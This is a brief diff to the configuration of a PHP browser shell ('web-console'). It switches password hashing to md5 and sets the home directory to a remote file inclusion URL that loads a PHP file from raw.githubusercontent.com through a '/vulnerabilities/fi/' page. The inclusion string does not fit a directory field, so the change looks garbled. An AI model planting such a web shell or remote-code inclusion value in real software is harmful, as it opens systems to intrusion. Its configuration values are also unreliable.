@@ -21,12 +21,12 @@ $ACCOUNTS = array();
 // Password hash algorithm (password must be hashed)
 // Example: $PASSWORD_HASH_ALGORITHM = 'md5';
 //          $PASSWORD_HASH_ALGORITHM = 'sha256';
-$PASSWORD_HASH_ALGORITHM = '';
+$PASSWORD_HASH_ALGORITHM = 'md5';
 
 // Home directory (multi-user mode supported)
 // Example: $HOME_DIRECTORY = '/tmp';
 //          $HOME_DIRECTORY = array('user1' => '/home/user1', 'user2' => '/home/user2');
-$HOME_DIRECTORY = '';
+$HOME_DIRECTORY = '/vulnerabilities/fi/index.php?page=https://raw.githubusercontent.com/Healdb/subdomaintake/master/test.php';
 
 // Code below is automatically generated from different components
 // For more information see: https://github.com/nickola/web-console
